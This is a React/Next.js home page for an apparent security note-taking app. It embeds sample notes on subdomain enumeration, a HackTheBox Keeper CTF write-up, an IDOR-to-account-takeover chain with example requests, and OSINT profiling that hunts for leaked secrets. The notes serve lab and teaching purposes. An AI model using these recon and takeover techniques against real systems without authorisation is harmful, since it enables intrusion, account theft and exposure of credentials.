"use client";

import Link from "next/link";
import Navbar from "@/components/Navbar";
import { useAuth } from "@clerk/nextjs";
import { useState } from "react";

type MockNote = {
  id: string;
  category: string;
  title: string;
  excerpt: string;
  tags: string[];
  content: string;
};

const MOCK_NOTES: MockNote[] = [
  {
    id: "1",
    category: "Recon",
    title: "Subdomain enumeration workflow",
    excerpt: "Start with passive: subfinder, amass, crt.sh. Then active: ffuf with SecLists...",
    tags: ["recon", "subdomain", "ffuf"],
    content: `## Subdomain Enumeration Workflow

### Passive Recon
Start passive — no direct contact with the target:

\`\`\`bash
subfinder -d target.com -o subs_passive.txt
amass enum -passive -d target.com >> subs_passive.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u >> subs_passive.txt
\`\`\`

### Active Brute-Force
Use SecLists wordlist with ffuf:

\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\
  -u https://FUZZ.target.com -mc 200,301,302,403
\`\`\`

### Find Live Hosts
Pipe everything into httpx to check what's actually alive:

\`\`\`bash
cat subs_passive.txt | sort -u | httpx -silent -o live_hosts.txt
\`\`\`

### Screenshot for Triage
\`\`\`bash
gowitness file -f live_hosts.txt --screenshot-path ./screenshots/
\`\`\`

### Tips
- Always check for **dev**, **staging**, **admin**, **api** subdomains
- Look for older subdomains on Wayback Machine
- Check DNS zone transfers: \`dig axfr @ns1.target.com target.com\``,
  },
  {
    id: "2",
    category: "CTF Writeup",
    title: "HackTheBox — Keeper writeup",
    excerpt: "Initial foothold via default KeePass web credentials. Cracked KeePass dump...",
    tags: ["htb", "keepass", "linux"],
    content: `## HackTheBox — Keeper Writeup

**Difficulty:** Easy | **OS:** Linux

---

### Initial Foothold
Navigated to port 80 — found a **Request Tracker** ticketing system.
Default credentials worked: \`root:Welcome2023!\`

Inside the ticket system, found a note referencing a user **lnorgaard** with password **Welcome2023!**

\`\`\`bash
ssh lnorgaard@10.10.11.227
# logged in successfully
\`\`\`

### Privilege Escalation
Found a zip in the home directory containing a **KeePass .dmp** memory dump and a **.kdbx** database file.

Extract the master password from the memory dump:
\`\`\`bash
python3 keepass-dump-masterkey/poc.py -d KeePassDumpFull.dmp
# Output: ●ødgrød med fløde
# Actual password: rødgrød med fløde (Danish dessert)
\`\`\`

Open the .kdbx file with KeePassXC using the recovered password.
Inside: **root SSH private key** stored as attachment.

\`\`\`bash
chmod 600 root_key
ssh -i root_key root@10.10.11.227
cat /root/root.txt
\`\`\`

### Flags
- **User:** \`lnorgaard\` home directory
- **Root:** SSH key inside KeePass vault`,
  },
  {
    id: "3",
    category: "Web Exploitation",
    title: "IDOR to account takeover",
    excerpt: "PATCH /api/users/{id} — swapped id to victim's. Server only validated session...",
    tags: ["idor", "auth", "api"],
    content: `## IDOR to Full Account Takeover

**Severity:** Critical | **CVSS:** 9.1

---

### Discovery
While testing a SaaS app, intercepted a profile update request in Burp Suite:

\`\`\`http
PATCH /api/v1/users/8472 HTTP/1.1
Authorization: Bearer <my_token>
Content-Type: application/json

{
  "email": "myemail@test.com",
  "username": "myuser"
}
\`\`\`

### Exploitation
Changed the user ID in the URL from my own (\`8472\`) to a victim's (\`8471\`):

\`\`\`http
PATCH /api/v1/users/8471 HTTP/1.1
Authorization: Bearer <my_token>

{
  "email": "attacker@evil.com"
}
\`\`\`

**Result:** 200 OK — email changed on victim's account.

### Full Takeover Chain
1. IDOR to change victim's email to attacker-controlled address
2. Trigger "Forgot Password" for that email
3. Reset link arrives in attacker inbox
4. Full account takeover ✓

### Root Cause
Server validated that a **session existed**, but never checked whether the **session owner matched the resource owner**.

### Fix
\`\`\`python
# Server should enforce:
if current_user.id != requested_user_id:
    return 403, "Forbidden"
\`\`\``,
  },
  {
    id: "4",
    category: "OSINT",
    title: "Target profiling methodology",
    excerpt: "LinkedIn → employees → tech stack from job posts. GitHub org → leaked .env...",
    tags: ["osint", "recon", "social"],
    content: `## Target Profiling Methodology

A structured approach to building a target profile before engagement.

---

### Step 1 — Corporate Structure
- **LinkedIn:** Find employees, org chart, tech leads
- **Job postings:** Reveal tech stack (e.g. "experience with AWS Lambda, Postgres, Terraform")
- **Crunchbase / LinkedIn Company:** Funding, acquisitions, subsidiaries

### Step 2 — Technical Footprint
\`\`\`bash
# Find all domains and IPs
theHarvester -d target.com -b all

# Shodan for exposed infrastructure
shodan search org:"Target Corp" --fields ip_str,port,hostnames

# Check BGP/ASN data
curl https://api.bgpview.io/search?query_term=target.com
\`\`\`

### Step 3 — GitHub Intel
\`\`\`bash
# Search GitHub for leaked secrets
gh search code "target.com" --extension env
gh search code "api.target.com" password OR secret OR key
\`\`\`

Look for:
- Exposed \`.env\` files in commit history
- Hardcoded API keys or DB credentials
- Internal tooling repos accidentally made public

### Step 4 — Email Harvesting
\`\`\`bash
theHarvester -d target.com -b linkedin,google,bing -f emails.txt
\`\`\`

Cross-reference emails against **HaveIBeenPwned** for breach data.

### Step 5 — Wayback Machine
\`\`\`bash
waybackurls target.com | grep -E "\\.(php|asp|jsp|env|config|sql)"
\`\`\`

Old endpoints, forgotten admin panels, exposed backups.`,
  },
];

const CATEGORY_COLORS: Record<string, string> = {
  Recon: "#c4b5fd",
  "CTF Writeup": "#f9a8d4",
  "Web Exploitation": "#f0abfc",
  Tools: "#e9d5ff",
  General: "#ddd6fe",
  Forensics: "#fde68a",
  OSINT: "#a78bfa",
  "Privilege Escalation": "#fb7185",
};

function NoteModal({ note, onClose }: { note: MockNote; onClose: () => void }) {
  const color = CATEGORY_COLORS[note.category] ?? "#c4b5fd";

  return (
    <div
      onClick={onClose}
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(10,6,20,0.85)",
        backdropFilter: "blur(6px)",
        zIndex: 1000,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "1.5rem",
      }}
    >
      <div
        onClick={(e) => e.stopPropagation()}
        style={{
          background: "#1a1228",
          border: "1px solid #2e1f4a",
          borderRadius: "14px",
          width: "100%",
          maxWidth: "700px",
          maxHeight: "85vh",
          overflow: "hidden",
          display: "flex",
          flexDirection: "column",
          boxShadow: "0 0 80px rgba(196,181,253,0.1), 0 32px 64px rgba(0,0,0,0.5)",
        }}
      >
        {/* Modal header */}
        <div style={{
          padding: "1.25rem 1.5rem",
          borderBottom: "1px solid #2e1f4a",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "flex-start",
          gap: "1rem",
          flexShrink: 0,
        }}>
          <div style={{ flex: 1 }}>
            <span style={{
              display: "inline-flex",
              padding: "0.2rem 0.6rem",
              background: `${color}18`,
              border: `1px solid ${color}50`,
              borderRadius: "4px",
              fontSize: "0.62rem",
              color,
              fontFamily: "JetBrains Mono, monospace",
              fontWeight: 600,
              letterSpacing: "0.08em",
              marginBottom: "0.6rem",
            }}>
              {note.category.toUpperCase()}
            </span>
            <h2 style={{
              fontFamily: "JetBrains Mono, monospace",
              fontSize: "1.15rem",
              fontWeight: 700,
              color: "#ede9fe",
              lineHeight: 1.3,
            }}>
              {note.title}
            </h2>
            <div style={{ display: "flex", gap: "0.4rem", marginTop: "0.6rem", flexWrap: "wrap" }}>
              {note.tags.map(tag => (
                <span key={tag} style={{
                  fontSize: "0.62rem",
                  color: "#7c6a9e",
                  background: "#221836",
                  padding: "0.15rem 0.45rem",
                  borderRadius: "4px",
                  fontFamily: "JetBrains Mono, monospace",
                }}>
                  #{tag}
                </span>
              ))}
            </div>
          </div>
          <button
            onClick={onClose}
            style={{
              background: "transparent",
              border: "1px solid #2e1f4a",
              color: "#7c6a9e",
              width: "32px",
              height: "32px",
              borderRadius: "6px",
              cursor: "pointer",
              fontSize: "1rem",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              flexShrink: 0,
            }}
          >
            ×
          </button>
        </div>

        {/* Modal content */}
        <div style={{
          padding: "1.5rem",
          overflowY: "auto",
          flex: 1,
        }}>
          <pre style={{
            fontFamily: "JetBrains Mono, monospace",
            fontSize: "0.82rem",
            color: "#c4b5fd",
            lineHeight: 1.8,
            whiteSpace: "pre-wrap",
            wordBreak: "break-word",
            margin: 0,
          }}>
            {note.content}
          </pre>
        </div>

        {/* Modal footer */}
        <div style={{
          padding: "1rem 1.5rem",
          borderTop: "1px solid #2e1f4a",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexShrink: 0,
        }}>
          <span style={{ fontSize: "0.68rem", color: "#3d2f5a", fontFamily: "JetBrains Mono, monospace" }}>
            sample note — sign in to create your own
          </span>
          <Link href="/sign-up" style={{
            padding: "0.45rem 1rem",
            background: "#c4b5fd",
            color: "#0f0b1a",
            fontFamily: "JetBrains Mono, monospace",
            fontSize: "0.75rem",
            fontWeight: 700,
            textDecoration: "none",
            borderRadius: "6px",
          }}>
            start writing ✦
          </Link>
        </div>
      </div>
    </div>
  );
}

export default function HomePage() {
  const { isSignedIn, isLoaded } = useAuth();
  const [activeNote, setActiveNote] = useState<MockNote | null>(null);

  return (
    <div style={{ minHeight: "100vh", background: "#0f0b1a", display: "flex", flexDirection: "column" }}>
      <Navbar />

      {activeNote && (
        <NoteModal note={activeNote} onClose={() => setActiveNote(null)} />
      )}

      <main style={{ flex: 1, position: "relative", overflow: "hidden" }}>
        {/* Background blobs */}
        <div style={{
          position: "absolute", top: "-20%", left: "-10%",
          width: "700px", height: "700px",
          background: "radial-gradient(circle, rgba(196,181,253,0.07) 0%, transparent 70%)",
          pointerEvents: "none",
        }} />
        <div style={{
          position: "absolute", bottom: "-20%", right: "-10%",
          width: "600px", height: "600px",
          background: "radial-gradient(circle, rgba(240,171,252,0.06) 0%, transparent 70%)",
          pointerEvents: "none",
        }} />

        <div style={{
          maxWidth: "1280px",
          margin: "0 auto",
          padding: "5rem 2rem",
          display: "flex",
          alignItems: "center",
          gap: "4rem",
          flexWrap: "wrap",
        }}>
          {/* Left — Text */}
          <div style={{ flex: "1 1 340px", maxWidth: "480px" }}>
            <div style={{
              display: "inline-flex",
              alignItems: "center",
              border: "1px solid rgba(196,181,253,0.25)",
              background: "rgba(196,181,253,0.06)",
              padding: "0.35rem 1rem",
              borderRadius: "999px",
              marginBottom: "2rem",
              fontSize: "0.72rem",
              color: "#c4b5fd",
              letterSpacing: "0.1em",
            }}>
              ⚡ hack. document. dominate.
            </div>

            <h1 style={{
              fontFamily: "JetBrains Mono, monospace",
              fontSize: "clamp(2rem, 5vw, 3.2rem)",
              fontWeight: 700,
              lineHeight: 1.2,
              color: "#ede9fe",
              marginBottom: "1.5rem",
            }}>
              Your intel,{" "}
              <span style={{ color: "#c4b5fd", textShadow: "0 0 28px rgba(196,181,253,0.5)" }}>
                encrypted
              </span>
              <br />&amp; yours alone.
            </h1>

            <p style={{
              fontFamily: "JetBrains Mono, monospace",
              fontSize: "0.92rem",
              color: "#7c6a9e",
              lineHeight: 1.9,
              marginBottom: "2.5rem",
            }}>
              Document your exploits, writeups &amp; recon notes.
              <br />Tagged, searchable, and locked behind your login —
              <br />because good intel deserves a safe home.
            </p>

            <div style={{ display: "flex", gap: "1rem", flexWrap: "wrap" }}>
              <Link href="/notes/new" style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "0.5rem",
                padding: "0.8rem 1.8rem",
                background: "#c4b5fd",
                color: "#0f0b1a",
                fontFamily: "JetBrains Mono, monospace",
                fontWeight: 700,
                fontSize: "0.875rem",
                textDecoration: "none",
                borderRadius: "6px",
                boxShadow: "0 0 24px rgba(196,181,253,0.25)",
              }}>
                Start writing ✦
              </Link>
              {isLoaded && !isSignedIn && (
                <Link href="/sign-in" style={{
                  display: "inline-flex",
                  alignItems: "center",
                  padding: "0.8rem 1.8rem",
                  border: "1px solid rgba(196,181,253,0.3)",
                  color: "#c4b5fd",
                  background: "transparent",
                  fontFamily: "JetBrains Mono, monospace",
                  fontWeight: 500,
                  fontSize: "0.875rem",
                  textDecoration: "none",
                  borderRadius: "6px",
                }}>
                  Sign in
                </Link>
              )}
            </div>

            <p style={{
              marginTop: "2.5rem",
              fontSize: "0.68rem",
              color: "#3d2f5a",
              fontFamily: "JetBrains Mono, monospace",
              letterSpacing: "0.08em",
            }}>
              if it's not documented, it didn't happen. — kanisha ✦
            </p>
          </div>

          {/* Right — Notes mockup */}
          <div style={{ flex: "1 1 380px", maxWidth: "560px" }}>
            <div style={{
              background: "#1a1228",
              border: "1px solid #2e1f4a",
              borderRadius: "12px",
              overflow: "hidden",
              boxShadow: "0 0 60px rgba(196,181,253,0.08), 0 32px 64px rgba(0,0,0,0.4)",
            }}>
              {/* Window chrome */}
              <div style={{
                padding: "0.75rem 1.25rem",
                background: "#130f20",
                borderBottom: "1px solid #2e1f4a",
                display: "flex",
                alignItems: "center",
                gap: "0.5rem",
              }}>
                <div style={{ width: "10px", height: "10px", borderRadius: "50%", background: "#fb7185", opacity: 0.8 }} />
                <div style={{ width: "10px", height: "10px", borderRadius: "50%", background: "#fde68a", opacity: 0.8 }} />
                <div style={{ width: "10px", height: "10px", borderRadius: "50%", background: "#c4b5fd", opacity: 0.8 }} />
                <span style={{
                  marginLeft: "0.75rem",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: "0.7rem",
                  color: "#7c6a9e",
                }}>
                  ✦ cybernotes / dashboard
                </span>
              </div>

              {/* Search bar mockup */}
              <div style={{ padding: "1rem 1.25rem", borderBottom: "1px solid #2e1f4a" }}>
                <div style={{
                  background: "#221836",
                  border: "1px solid #2e1f4a",
                  borderRadius: "6px",
                  padding: "0.5rem 1rem",
                  display: "flex",
                  alignItems: "center",
                  gap: "0.5rem",
                }}>
                  <span style={{ color: "#7c6a9e", fontSize: "0.75rem", fontFamily: "JetBrains Mono, monospace" }}>/search</span>
                  <span style={{ color: "#3d2f5a", fontSize: "0.75rem", fontFamily: "JetBrains Mono, monospace", flex: 1 }}>search notes...</span>
                </div>
              </div>

              {/* Notes grid */}
              <div style={{
                display: "grid",
                gridTemplateColumns: "1fr 1fr",
                gap: "0.75rem",
                padding: "1rem 1.25rem 1.25rem",
              }}>
                {MOCK_NOTES.map((note) => {
                  const color = CATEGORY_COLORS[note.category] ?? "#c4b5fd";
                  return (
                    <button
                      key={note.id}
                      onClick={() => setActiveNote(note)}
                      style={{
                        background: "#130f20",
                        border: "1px solid #2e1f4a",
                        borderRadius: "8px",
                        padding: "1rem",
                        cursor: "pointer",
                        textAlign: "left",
                        transition: "border-color 0.2s, box-shadow 0.2s",
                        width: "100%",
                      }}
                      onMouseEnter={e => {
                        (e.currentTarget as HTMLElement).style.borderColor = "#c4b5fd";
                        (e.currentTarget as HTMLElement).style.boxShadow = "0 0 16px rgba(196,181,253,0.1)";
                      }}
                      onMouseLeave={e => {
                        (e.currentTarget as HTMLElement).style.borderColor = "#2e1f4a";
                        (e.currentTarget as HTMLElement).style.boxShadow = "none";
                      }}
                    >
                      <div style={{
                        display: "inline-flex",
                        padding: "0.15rem 0.5rem",
                        background: `${color}18`,
                        border: `1px solid ${color}40`,
                        borderRadius: "4px",
                        fontSize: "0.6rem",
                        color,
                        fontFamily: "JetBrains Mono, monospace",
                        marginBottom: "0.6rem",
                        letterSpacing: "0.04em",
                      }}>
                        {note.category}
                      </div>
                      <p style={{
                        fontFamily: "JetBrains Mono, monospace",
                        fontSize: "0.75rem",
                        fontWeight: 600,
                        color: "#ede9fe",
                        marginBottom: "0.4rem",
                        lineHeight: 1.4,
                      }}>
                        {note.title}
                      </p>
                      <p style={{
                        fontFamily: "JetBrains Mono, monospace",
                        fontSize: "0.65rem",
                        color: "#7c6a9e",
                        lineHeight: 1.6,
                        overflow: "hidden",
                        display: "-webkit-box",
                        WebkitLineClamp: 2,
                        WebkitBoxOrient: "vertical",
                      }}>
                        {note.excerpt}
                      </p>
                      <div style={{ display: "flex", gap: "0.3rem", marginTop: "0.6rem", flexWrap: "wrap" }}>
                        {note.tags.map(tag => (
                          <span key={tag} style={{
                            fontSize: "0.58rem",
                            color: "#7c6a9e",
                            background: "#221836",
                            padding: "0.1rem 0.4rem",
                            borderRadius: "4px",
                            fontFamily: "JetBrains Mono, monospace",
                          }}>
                            #{tag}
                          </span>
                        ))}
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>

            <p style={{
              textAlign: "center",
              marginTop: "1rem",
              fontSize: "0.68rem",
              color: "#3d2f5a",
              fontFamily: "JetBrains Mono, monospace",
              letterSpacing: "0.08em",
            }}>
              click any note to preview ✦
            </p>
          </div>
        </div>
      </main>

      <footer style={{
        borderTop: "1px solid #2e1f4a",
        padding: "1.25rem",
        textAlign: "center",
        color: "#3d2f5a",
        fontFamily: "JetBrains Mono, monospace",
        fontSize: "0.72rem",
      }}>
        <span style={{ color: "#c4b5fd", opacity: 0.6 }}>✦</span> by kanisha &nbsp;·&nbsp; <span style={{ fontStyle: "italic" }}>"write it down before you forget it"</span>
      </footer>
    </div>
  );
}
